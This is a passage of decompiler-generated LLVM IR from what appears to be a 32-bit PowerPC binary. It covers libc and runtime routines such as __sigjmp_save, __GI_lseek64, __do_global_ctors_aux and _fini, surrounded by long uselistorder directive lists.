  uselistorder i16 8, { 2, 0, 1 }
  uselistorder i32 9, { 6, 57, 56, 7, 8, 9, 1, 10, 11, 12, 13, 14, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 15, 16, 17, 33, 18, 19, 20, 34, 0, 21, 22, 4, 44, 35, 5, 36, 37, 38, 39, 40, 41, 42, 43, 45, 46, 23, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* @r9, { 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 64, 2, 65, 67, 68, 12, 82, 70, 71, 76, 77, 78, 61, 17, 72, 73, 74, 75, 66, 63, 69, 11, 13, 10, 14, 15, 3, 81, 16, 79, 80, 4, 5, 6, 7, 8, 1, 9 }
  uselistorder i32 16, { 197, 198, 199, 98, 99, 100, 200, 78, 201, 202, 97, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 2, 221, 226, 227, 228, 236, 237, 238, 101, 102, 118, 119, 103, 104, 239, 222, 223, 0, 47, 224, 79, 225, 220, 1, 48, 49, 229, 230, 231, 50, 80, 235, 232, 233, 234, 203, 204, 240, 241, 120, 105, 121, 53, 52, 81, 82, 83, 54, 84, 85, 55, 86, 87, 56, 106, 188, 189, 89, 107, 96, 88, 109, 57, 110, 111, 112, 113, 114, 115, 116, 3, 4, 5, 6, 58, 108, 90, 117, 91, 61, 60, 59, 92, 93, 62, 171, 172, 173, 174, 175, 7, 63, 122, 8, 9, 123, 124, 125, 64, 126, 10, 127, 128, 129, 130, 131, 132, 65, 133, 11, 12, 13, 134, 135, 68, 136, 67, 66, 137, 14, 138, 15, 16, 70, 139, 140, 17, 18, 19, 20, 21, 22, 141, 142, 143, 69, 144, 23, 145, 24, 25, 72, 146, 147, 26, 27, 28, 29, 30, 148, 149, 150, 71, 151, 152, 153, 31, 32, 74, 155, 156, 157, 33, 51, 158, 94, 154, 73, 159, 34, 35, 36, 160, 161, 75, 162, 163, 164, 37, 165, 38, 39, 40, 166, 169, 170, 167, 168, 176, 41, 42, 177, 178, 76, 179, 180, 43, 181, 182, 44, 45, 46, 183, 186, 187, 184, 185, 95, 190, 77, 191, 192, 193, 194, 195, 196 }
  uselistorder i1 false, { 17, 3, 18, 19, 20, 21, 4, 22, 23, 24, 25, 5, 6, 7, 8, 26, 27, 9, 28, 29, 30, 31, 32, 10, 34, 16, 15, 0, 1, 11, 12, 35, 36, 37, 38, 13, 39, 33, 14, 2, 40, 41 }
  uselistorder i1* @cr0_eq, { 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 44, 43, 14, 45, 46, 47, 15, 48, 2, 49, 16, 1, 17, 0, 18, 19, 50, 51, 4, 3, 20, 5, 21, 6, 52, 22, 23, 8, 7, 53, 24, 11, 54, 25, 26, 10, 56, 9, 57, 58, 27, 12, 70, 69, 55, 28, 13, 61, 62, 63, 64, 65, 66, 67, 59, 60, 38, 72, 73, 74, 75, 68, 71 }
  uselistorder i32* @r31, { 192, 4, 193, 194, 195, 196, 5, 197, 198, 199, 200, 6, 201, 202, 203, 41, 204, 205, 206, 217, 7, 1, 218, 219, 220, 8, 221, 222, 223, 224, 9, 225, 226, 10, 227, 228, 11, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 12, 13, 14, 15, 241, 242, 243, 244, 245, 246, 247, 248, 16, 17, 18, 249, 250, 251, 252, 253, 254, 255, 256, 257, 19, 258, 259, 40, 20, 36, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 274, 273, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 21, 22, 23, 24, 293, 294, 295, 298, 299, 25, 300, 301, 302, 303, 304, 305, 0, 26, 306, 307, 308, 309, 310, 311, 37, 312, 313, 314, 325, 326, 42, 27, 43, 44, 45, 46, 327, 28, 328, 169, 87, 88, 89, 90, 91, 92, 93, 385, 392, 393, 386, 38, 170, 171, 172, 173, 174, 185, 377, 378, 379, 380, 381, 382, 383, 384, 329, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 29, 343, 344, 345, 346, 330, 331, 31, 315, 316, 317, 318, 319, 320, 321, 30, 322, 323, 324, 296, 297, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 2, 372, 365, 366, 367, 368, 369, 370, 371, 373, 374, 375, 376, 161, 175, 147, 176, 177, 49, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 94, 32, 95, 96, 97, 98, 47, 48, 103, 104, 99, 33, 100, 101, 102, 105, 106, 107, 108, 178, 387, 388, 389, 390, 391, 50, 51, 57, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 3, 82, 83, 84, 85, 86, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 162, 163, 164, 165, 166, 167, 168, 179, 180, 39, 181, 182, 183, 184, 34, 187, 186, 188, 35, 189, 190, 191 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fed0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fec4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe74, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe68, { 1, 0 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fee8 = load i32, i32* @r4, align 4
  %v3_1000fee8 = icmp eq i32 %v0_1000fee8, 0
  %v0_1000fef8 = load i32, i32* @r3, align 4
  store i32 %v0_1000fef8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fee8, label %dec_label_pc_1000ff20, label %dec_label_pc_1000ff04

dec_label_pc_1000ff04:                            ; preds = %entry
  %v1_1000ff0c = add i32 %v0_1000fef8, 452
  %v4_1000ff10 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_1000ff0c)
  %v3_1000ff18 = icmp eq i32 %v4_1000ff10, 0
  br i1 %v3_1000ff18, label %dec_label_pc_1000ff24, label %dec_label_pc_1000ff20

dec_label_pc_1000ff20:                            ; preds = %dec_label_pc_1000ff04, %entry
  br label %dec_label_pc_1000ff24

dec_label_pc_1000ff24:                            ; preds = %dec_label_pc_1000ff04, %dec_label_pc_1000ff20
  %v0_1000ff24 = phi i32 [ 1, %dec_label_pc_1000ff04 ], [ 0, %dec_label_pc_1000ff20 ]
  %v1_1000ff24 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ff24 = add i32 %v1_1000ff24, 448
  %v3_1000ff24 = inttoptr i32 %v2_1000ff24 to i32*
  store i32 %v0_1000ff24, i32* %v3_1000ff24, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 3, 4, 0 }
  uselistorder i32* null, { 1, 0, 9, 2, 3, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 4, 26, 27, 28, 29, 48, 35, 36, 37, 38, 39, 40, 5, 41, 42, 43, 44, 6, 45, 46, 7, 47, 8, 49, 30, 31, 32, 33, 34 }
  uselistorder i32* @r4, { 116, 7, 117, 118, 8, 23, 6, 21, 120, 121, 122, 22, 119, 114, 9, 130, 1, 131, 2, 3, 132, 4, 133, 134, 10, 135, 11, 136, 137, 138, 139, 140, 141, 12, 143, 144, 13, 79, 147, 153, 152, 18, 19, 149, 142, 148, 145, 146, 14, 26, 27, 15, 115, 123, 124, 125, 126, 99, 100, 16, 17, 24, 25, 80, 150, 151, 127, 128, 129, 20, 105, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 67, 68, 65, 28, 29, 30, 101, 102, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 0, 5, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 103, 104, 106, 107, 108, 109, 110, 111, 112, 113 }
  uselistorder label %dec_label_pc_1000ff24, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000ff60 = call i32 @__asm_mfcr()
  store i32 %v0_1000ff60, i32* %r0.global-to-local, align 4
  %v1_1000ff64 = and i32 %v0_1000ff60, 268435456
  %v3_1000ff64 = icmp eq i32 %v1_1000ff64, 0
  br i1 %v3_1000ff64, label %dec_label_pc_1000ff88, label %dec_label_pc_1000ff6c

dec_label_pc_1000ff6c:                            ; preds = %entry
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000ff78 = load i32, i32* @r2, align 4
  %v1_1000ff7c = add i32 %v0_1000ff78, -28672
  %v2_1000ff80 = inttoptr i32 %v1_1000ff7c to i32*
  store i32 %v0_1000ff60, i32* %v2_1000ff80, align 4
  %v0_1000ff94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ff94

dec_label_pc_1000ff88:                            ; preds = %entry
  %v3_1000ff88 = icmp eq i32 %v0_1000ff60, 0
  store i32 %v0_1000ff60, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ff88, label %dec_label_pc_1000ffa0, label %dec_label_pc_1000ff94

dec_label_pc_1000ff94:                            ; preds = %dec_label_pc_1000ff88, %dec_label_pc_1000ff6c
  %v0_1000ff94 = phi i32 [ %v0_1000ff60, %dec_label_pc_1000ff88 ], [ %v0_1000ff94.pre, %dec_label_pc_1000ff6c ]
  %tmp = icmp slt i32 %v0_1000ff94, 0
  %v1_1000ff98 = zext i1 %tmp to i32
  %v2_1000ff98 = ashr i32 %v0_1000ff94, 31
  %v3_1000ff98 = and i32 %v2_1000ff98, -2
  %v4_1000ff98 = or i32 %v3_1000ff98, %v1_1000ff98
  br label %dec_label_pc_1000ffa8

dec_label_pc_1000ffa0:                            ; preds = %dec_label_pc_1000ff88
  %v3_1000ffa0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ffa8

dec_label_pc_1000ffa8:                            ; preds = %dec_label_pc_1000ff94, %dec_label_pc_1000ffa0
  %v0_1000ffac = phi i32 [ %v4_1000ff98, %dec_label_pc_1000ff94 ], [ %v3_1000ffa0, %dec_label_pc_1000ffa0 ]
  ret i32 %v0_1000ffac

; uselistorder directives
  uselistorder i32 %v0_1000ff94, { 1, 0 }
  uselistorder i32 %v0_1000ff60, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 -2, { 6, 18, 1, 0, 8, 9, 7, 2, 10, 3, 11, 12, 13, 14, 15, 16, 17, 4, 5 }
  uselistorder i32 31, { 8, 47, 48, 49, 53, 54, 55, 56, 57, 58, 59, 62, 33, 34, 60, 61, 50, 51, 52, 63, 64, 35, 36, 29, 30, 37, 38, 39, 40, 0, 9, 10, 11, 12, 1, 13, 2, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 4, 27, 28, 31, 32, 5, 43, 44, 41, 42, 6, 45, 7, 46 }
  uselistorder i32 -28672, { 2, 34, 35, 3, 4, 36, 0, 40, 41, 25, 45, 43, 46, 5, 14, 15, 50, 51, 52, 54, 33, 47, 44, 42, 48, 49, 7, 8, 26, 27, 24, 28, 23, 29, 13, 30, 9, 31, 22, 10, 37, 38, 53, 1, 16, 17, 18, 19, 55, 11, 32, 20, 12, 21, 56, 57, 6, 39 }
  uselistorder i32* @r2, { 4, 50, 51, 5, 6, 54, 55, 3, 56, 60, 61, 62, 63, 64, 65, 66, 67, 1, 68, 69, 70, 71, 72, 74, 33, 32, 78, 76, 79, 7, 19, 20, 83, 84, 85, 86, 93, 94, 95, 53, 52, 92, 73, 34, 88, 89, 90, 9, 10, 46, 47, 48, 2, 49, 80, 77, 75, 81, 82, 11, 12, 35, 36, 31, 30, 38, 37, 29, 28, 40, 39, 18, 41, 13, 43, 42, 27, 15, 14, 57, 58, 87, 0, 21, 22, 23, 24, 91, 16, 45, 44, 25, 17, 26, 96, 97, 98, 8, 59 }
  uselistorder i32 268435456, { 119, 120, 146, 137, 149, 148, 150, 121, 128, 129, 151, 152, 153, 154, 145, 138, 139, 136, 140, 135, 141, 127, 142, 123, 143, 134, 124, 130, 131, 155, 125, 144, 132, 126, 133, 156, 157, 122, 147, 0, 3, 1, 2, 6, 4, 5, 7, 8, 11, 9, 10, 12, 15, 13, 14, 16, 19, 17, 18, 20, 21, 22, 25, 23, 24, 28, 26, 27, 31, 29, 30, 34, 32, 33, 37, 35, 36, 40, 38, 39, 43, 41, 42, 44, 45, 46, 47, 48, 49, 52, 50, 51, 55, 53, 54, 58, 56, 57, 61, 59, 60, 64, 62, 63, 67, 65, 66, 70, 68, 69, 71, 72, 73, 74, 75, 78, 76, 77, 81, 79, 80, 84, 82, 83, 87, 85, 86, 90, 88, 89, 93, 91, 92, 94, 95, 96, 97, 98, 101, 99, 100, 104, 102, 103, 107, 105, 106, 110, 108, 109, 113, 111, 112, 114, 115, 116, 117, 118 }
  uselistorder i32 ()* @__asm_mfcr, { 109, 108, 36, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 15, 14, 104, 52, 17, 18, 16, 13, 107, 12, 11, 10, 96, 95, 9, 8, 7, 2, 37, 38, 3, 21, 20, 19, 51, 6, 5, 103, 41, 40, 39, 50, 49, 58, 48, 65, 47, 97, 46, 102, 45, 79, 101, 94, 93, 92, 91, 44, 4, 100, 43, 90, 99, 89, 98, 1, 0, 106, 105, 34, 110, 88, 87, 86, 85, 84, 83, 82, 81, 80, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 64, 63, 62, 61, 60, 59, 57, 56, 55, 54, 53, 42 }
  uselistorder label %dec_label_pc_1000ffa8, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10021054.545 to i32), i32* %r31.global-to-local, align 4
  %v3_1000ffcc = load i32, i32* @global_var_10021054.545, align 4
  %v3_1000ffd0 = icmp eq i32 %v3_1000ffcc, -1
  br i1 %v3_1000ffd0, label %dec_label_pc_1000ffec, label %dec_label_pc_1000ffd8

dec_label_pc_1000ffd8:                            ; preds = %entry, %dec_label_pc_1000ffd8
  %v0_1000ffd8 = phi i32 [ %v3_1000ffe0, %dec_label_pc_1000ffd8 ], [ %v3_1000ffcc, %entry ]
  call void @__pseudo_call(i32 %v0_1000ffd8)
  %v0_1000ffe0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ffe0 = add i32 %v0_1000ffe0, -4
  %v2_1000ffe0 = inttoptr i32 %v1_1000ffe0 to i32*
  %v3_1000ffe0 = load i32, i32* %v2_1000ffe0, align 4
  store i32 %v1_1000ffe0, i32* %r31.global-to-local, align 4
  %v3_1000ffe4 = icmp eq i32 %v3_1000ffe0, -1
  br i1 %v3_1000ffe4, label %dec_label_pc_1000ffec, label %dec_label_pc_1000ffd8

dec_label_pc_1000ffec:                            ; preds = %dec_label_pc_1000ffd8, %entry
  %v0_1000fffc = load i32, i32* @r3, align 4
  ret i32 %v0_1000fffc

; uselistorder directives
  uselistorder i32 %v3_1000ffe0, { 1, 0 }
  uselistorder i32 -4, { 12, 13, 14, 15, 16, 5, 20, 0, 1, 19, 4, 6, 2, 3, 17, 18, 21, 22, 7, 8, 9, 10, 11 }
  uselistorder void (i32)* @__pseudo_call, { 5, 6, 7, 1, 2, 3, 4, 0 }
  uselistorder i32 -1, {}
  uselistorder i32 ptrtoint (i32* @global_var_10021054.545 to i32), { 1, 0 }
  uselistorder i32 1, { 341, 698, 342, 526, 456, 88, 172, 1069, 1070, 83, 84, 82, 85, 87, 86, 700, 699, 39, 35, 37, 30, 31, 38, 33, 32, 36, 34, 29, 701, 5, 6, 7, 40, 8, 259, 258, 527, 607, 1071, 1072, 517, 203, 199, 197, 198, 200, 202, 201, 204, 608, 457, 528, 1064, 1065, 1066, 1067, 1068, 529, 41, 702, 1075, 1076, 1077, 1078, 110, 109, 518, 1079, 1080, 1082, 1081, 510, 1083, 1084, 519, 1085, 520, 1086, 1087, 1088, 1089, 1090, 460, 459, 458, 558, 1091, 1092, 1093, 542, 521, 28, 27, 609, 1094, 1095, 693, 461, 462, 1096, 1097, 1098, 1099, 1100, 68, 66, 67, 65, 69, 530, 1101, 610, 1102, 1103, 463, 1104, 140, 141, 1105, 1106, 1107, 142, 611, 1108, 531, 703, 108, 105, 107, 106, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 522, 704, 71, 74, 70, 73, 72, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 207, 209, 206, 208, 211, 210, 612, 1128, 231, 1129, 1130, 1131, 1136, 1174, 1175, 78, 80, 81, 79, 77, 75, 76, 613, 705, 42, 43, 44, 11, 12, 9, 10, 13, 48, 45, 49, 50, 46, 47, 51, 706, 848, 170, 171, 707, 337, 544, 1177, 614, 709, 708, 447, 559, 1179, 464, 388, 387, 389, 465, 965, 712, 711, 710, 102, 101, 338, 100, 99, 1049, 615, 1050, 1051, 715, 714, 713, 467, 470, 469, 468, 466, 532, 805, 336, 533, 1176, 716, 616, 717, 1178, 617, 560, 719, 718, 618, 1137, 1140, 1141, 1142, 1143, 720, 472, 473, 471, 475, 477, 474, 476, 1144, 1145, 508, 1146, 1147, 1148, 1149, 485, 478, 486, 479, 484, 480, 483, 481, 487, 482, 1138, 1139, 619, 143, 144, 620, 561, 1132, 1133, 1134, 1135, 721, 57, 58, 55, 52, 53, 54, 56, 621, 722, 212, 625, 1150, 1151, 1152, 1153, 1154, 1155, 624, 1156, 1157, 1158, 1159, 1160, 534, 1161, 1162, 509, 1163, 1164, 623, 1165, 1166, 1167, 1168, 1169, 622, 1170, 1171, 1172, 1173, 723, 380, 376, 375, 373, 382, 383, 378, 385, 374, 377, 384, 381, 379, 103, 104, 808, 488, 626, 627, 726, 725, 724, 451, 450, 59, 628, 727, 1073, 729, 728, 489, 731, 730, 61, 60, 62, 943, 944, 64, 63, 1180, 1181, 234, 232, 233, 115, 111, 114, 113, 112, 732, 629, 733, 24, 23, 25, 807, 734, 235, 735, 630, 339, 340, 562, 736, 116, 26, 737, 98, 738, 394, 1074, 739, 372, 966, 967, 968, 511, 512, 523, 969, 516, 740, 18, 17, 20, 19, 21, 16, 22, 0, 970, 971, 972, 973, 974, 1, 976, 975, 977, 978, 979, 980, 507, 981, 982, 742, 741, 851, 849, 850, 513, 89, 90, 91, 92, 93, 1061, 1062, 536, 535, 1063, 386, 983, 984, 985, 631, 986, 505, 506, 1052, 256, 257, 988, 987, 543, 524, 989, 94, 96, 95, 97, 990, 261, 260, 263, 262, 264, 265, 266, 991, 343, 344, 346, 345, 992, 226, 227, 229, 228, 14, 15, 632, 525, 567, 633, 809, 810, 806, 811, 634, 812, 635, 813, 814, 819, 818, 815, 816, 817, 563, 564, 565, 821, 636, 822, 637, 638, 823, 639, 640, 824, 566, 831, 545, 832, 833, 546, 751, 750, 749, 748, 747, 746, 745, 744, 743, 222, 216, 220, 219, 221, 213, 214, 218, 217, 223, 215, 224, 225, 825, 826, 641, 827, 828, 642, 829, 830, 503, 498, 502, 500, 499, 504, 501, 820, 643, 752, 490, 493, 491, 492, 945, 753, 497, 496, 494, 495, 569, 834, 568, 835, 644, 645, 837, 838, 839, 836, 537, 840, 841, 646, 647, 842, 648, 843, 649, 764, 763, 762, 696, 761, 760, 759, 758, 757, 756, 755, 754, 246, 248, 245, 247, 244, 650, 547, 765, 651, 652, 570, 548, 767, 766, 250, 249, 653, 654, 657, 655, 844, 845, 656, 846, 514, 847, 549, 770, 769, 768, 252, 255, 254, 251, 253, 852, 853, 658, 854, 855, 856, 857, 3, 515, 2, 858, 859, 860, 861, 773, 772, 694, 695, 771, 454, 452, 453, 455, 946, 949, 947, 538, 948, 230, 950, 951, 952, 659, 660, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 874, 872, 873, 875, 876, 877, 661, 878, 550, 879, 880, 881, 539, 882, 883, 776, 775, 774, 353, 354, 350, 361, 359, 369, 358, 362, 363, 370, 368, 364, 365, 367, 349, 366, 355, 357, 371, 356, 360, 352, 351, 348, 347, 884, 885, 886, 887, 662, 551, 888, 778, 777, 297, 294, 300, 308, 309, 303, 311, 310, 291, 290, 307, 299, 304, 302, 305, 306, 296, 295, 312, 301, 298, 292, 293, 889, 890, 663, 891, 892, 893, 894, 895, 896, 664, 552, 897, 571, 572, 779, 436, 423, 429, 435, 444, 443, 437, 438, 445, 440, 442, 441, 433, 439, 434, 427, 428, 446, 432, 431, 430, 424, 425, 426, 665, 574, 573, 780, 236, 243, 242, 241, 237, 239, 240, 238, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 666, 553, 910, 575, 576, 781, 324, 320, 322, 333, 332, 315, 316, 323, 325, 326, 327, 328, 329, 330, 331, 334, 319, 317, 335, 321, 318, 313, 314, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 667, 921, 922, 668, 554, 923, 577, 578, 579, 782, 181, 178, 194, 193, 182, 183, 184, 185, 186, 187, 190, 179, 192, 195, 188, 189, 191, 175, 174, 196, 180, 177, 176, 173, 585, 586, 924, 925, 926, 927, 928, 669, 670, 555, 929, 580, 581, 582, 583, 584, 787, 786, 785, 784, 783, 270, 268, 274, 277, 282, 280, 278, 279, 281, 275, 276, 269, 267, 283, 271, 272, 273, 930, 931, 932, 933, 934, 935, 936, 937, 938, 940, 941, 939, 556, 942, 587, 588, 589, 788, 157, 148, 155, 167, 165, 147, 159, 160, 161, 163, 145, 166, 168, 158, 162, 153, 164, 156, 150, 149, 169, 154, 152, 151, 146, 953, 954, 955, 956, 957, 958, 959, 960, 962, 963, 961, 557, 964, 590, 591, 592, 793, 792, 791, 790, 789, 127, 118, 125, 129, 139, 135, 130, 131, 133, 132, 136, 137, 128, 123, 134, 126, 120, 119, 138, 124, 122, 121, 117, 993, 994, 995, 996, 997, 675, 998, 674, 999, 596, 1000, 676, 1001, 677, 1002, 595, 673, 1003, 1004, 1005, 540, 1006, 1007, 1008, 1009, 1010, 678, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 679, 680, 681, 1020, 1021, 1022, 1023, 682, 1024, 1025, 1026, 683, 1027, 1028, 1029, 684, 1030, 685, 686, 687, 1031, 1032, 1033, 1034, 688, 1035, 1036, 1037, 1038, 1039, 671, 672, 593, 1040, 1041, 689, 541, 1042, 1043, 1044, 1045, 690, 1046, 1047, 1048, 594, 802, 801, 800, 799, 798, 797, 796, 795, 794, 417, 414, 416, 404, 419, 415, 413, 405, 406, 411, 398, 407, 408, 410, 400, 399, 395, 396, 409, 412, 418, 397, 420, 421, 402, 401, 403, 4, 597, 598, 599, 600, 601, 602, 603, 604, 1053, 605, 606, 392, 390, 391, 393, 1054, 1055, 691, 1057, 692, 1058, 1056, 1059, 1060, 288, 287, 284, 286, 289, 285, 422, 205, 449, 804, 803, 448, 697 }
  uselistorder label %dec_label_pc_1000ffd8, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_10010018 = load i32, i32* @r3, align 4
  ret i32 %v0_10010018
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268501036, i32* @lr, align 4
  %v0_10010028 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_10010028
}

define i32 @function_10021188() local_unnamed_addr {
entry:
  %v0_10021188 = load i32, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v0_10021188)
  %v1_10021188 = load i32, i32* @r3, align 4
  ret i32 %v1_10021188

; uselistorder directives
  uselistorder i32* @r3, {}
  uselistorder void (i32)* @__pseudo_branch, { 0, 3, 1, 2 }
  uselistorder i32 0, { 26, 587, 588, 0, 80, 1158, 193, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1172, 1170, 1171, 1, 165, 1173, 1174, 1175, 1176, 1177, 262, 589, 590, 591, 592, 593, 594, 595, 1178, 24, 23, 22, 194, 25, 263, 1179, 1180, 1181, 81, 1184, 1185, 1186, 64, 1187, 82, 1188, 1189, 2, 586, 1182, 1183, 83, 1147, 1148, 1149, 1150, 85, 84, 3, 52, 30, 1201, 261, 264, 265, 1202, 1203, 1204, 166, 31, 1205, 46, 1206, 58, 1207, 167, 4, 59, 1208, 168, 1209, 1210, 1211, 47, 1212, 1213, 1214, 1215, 86, 1216, 1218, 1217, 169, 1219, 1220, 1221, 1222, 266, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1237, 1231, 1232, 1233, 89, 1234, 1235, 1236, 170, 1238, 87, 1239, 157, 1240, 88, 1241, 90, 1242, 91, 1243, 267, 92, 1244, 1248, 1245, 1246, 1247, 171, 1249, 158, 1250, 1251, 1252, 93, 1253, 1254, 1255, 1256, 1257, 1259, 1258, 173, 94, 1261, 1260, 172, 1262, 1263, 1264, 95, 1265, 96, 1266, 1267, 1268, 1269, 97, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 268, 1282, 1283, 1284, 1285, 1286, 1287, 269, 1288, 98, 1289, 159, 1290, 1291, 1292, 1293, 1294, 99, 1295, 160, 1296, 1297, 1299, 1300, 100, 1302, 102, 101, 1303, 1310, 1311, 103, 1312, 65, 1313, 1314, 1315, 1316, 195, 1317, 1318, 1319, 1341, 1342, 270, 1343, 1344, 1345, 1346, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 596, 597, 598, 599, 271, 272, 1347, 1348, 273, 1349, 913, 912, 1350, 1320, 1351, 601, 600, 602, 730, 104, 731, 732, 1450, 1451, 1452, 1465, 1466, 275, 1467, 276, 1468, 1469, 277, 1489, 1491, 174, 1492, 274, 1490, 1453, 1454, 1455, 5, 6, 1482, 1483, 175, 1484, 1485, 7, 8, 1481, 1298, 1301, 278, 914, 915, 279, 196, 916, 917, 918, 1470, 1471, 1472, 1473, 1474, 9, 608, 609, 177, 1104, 1102, 1103, 106, 1105, 105, 1107, 1106, 179, 1108, 178, 1109, 1110, 1111, 1112, 161, 1113, 53, 1114, 1115, 1116, 1117, 188, 1118, 1119, 176, 1456, 1458, 1457, 1459, 1460, 1461, 1462, 1463, 280, 1464, 281, 197, 1475, 282, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 107, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 283, 1380, 1381, 1382, 1383, 108, 1352, 1353, 284, 1354, 1355, 285, 1356, 1357, 1358, 1359, 109, 1321, 189, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 286, 1304, 1305, 1306, 1307, 1308, 1309, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 287, 1391, 1392, 1393, 1394, 1395, 288, 1396, 79, 110, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 198, 199, 200, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 111, 1417, 201, 202, 203, 1418, 1419, 1420, 78, 1421, 1422, 1423, 1424, 1425, 1426, 180, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 10, 11, 575, 610, 190, 12, 289, 611, 919, 920, 891, 890, 922, 921, 859, 858, 924, 923, 720, 925, 612, 927, 926, 823, 614, 613, 1151, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 290, 1198, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 928, 929, 48, 930, 931, 932, 933, 934, 733, 734, 735, 736, 112, 603, 604, 605, 606, 737, 743, 744, 745, 746, 113, 738, 739, 740, 741, 742, 747, 1476, 1477, 1478, 1479, 1480, 615, 936, 935, 748, 616, 766, 1486, 1487, 1488, 607, 1199, 1200, 937, 938, 49, 32, 939, 940, 60, 941, 943, 942, 191, 13, 944, 66, 33, 67, 34, 945, 946, 14, 68, 35, 69, 36, 947, 70, 948, 37, 38, 949, 71, 39, 950, 114, 291, 292, 27, 28, 16, 15, 749, 1139, 1140, 1141, 1142, 118, 116, 115, 1143, 117, 120, 119, 951, 121, 952, 122, 953, 954, 1120, 123, 1121, 1122, 955, 181, 40, 956, 17, 124, 957, 125, 958, 293, 617, 618, 297, 294, 619, 295, 620, 127, 621, 622, 623, 624, 625, 162, 626, 298, 578, 579, 580, 296, 627, 628, 631, 633, 634, 72, 73, 581, 582, 629, 126, 630, 299, 632, 182, 183, 635, 636, 637, 638, 639, 640, 128, 641, 204, 642, 643, 644, 645, 646, 647, 648, 300, 649, 650, 301, 651, 302, 652, 192, 583, 655, 656, 657, 658, 659, 660, 661, 205, 206, 666, 667, 303, 668, 662, 663, 664, 665, 669, 670, 29, 671, 